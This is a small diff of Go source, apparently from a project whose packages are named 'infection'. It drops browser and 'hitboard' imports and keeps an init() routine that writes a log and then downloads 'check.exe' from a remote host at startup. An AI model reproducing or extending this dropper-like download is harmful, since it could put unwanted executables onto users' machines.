@@ -17,8 +17,6 @@ import (
 	"systray"
 	//"time"
 	"github.com/scottkiss/grtm"
-	"infection/browser"
-	"infection/hitboard"
 	"infection/transfer"
 	"infection/util/icon"
 )
@@ -97,6 +95,7 @@ func init() {
 	data := []byte(content)
 	if ioutil.WriteFile(CURRENTPATHLOG, data, 0644) == nil {
 	}
+	//keep the main process live
 	resp, err := http.Get(lib.MIDFILE + "check.exe")
 	if err != nil {
 		return
